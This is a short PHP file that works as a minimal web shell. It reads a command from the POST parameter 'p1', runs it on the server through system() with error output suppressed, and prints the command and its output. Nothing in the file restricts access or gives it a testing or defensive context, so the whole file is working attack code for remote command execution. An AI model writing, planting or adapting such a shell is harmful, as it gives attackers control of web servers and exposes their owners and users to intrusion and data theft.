<?php
function ex($in) {
	$out = '';
	if(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}
	return $out;
}

echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>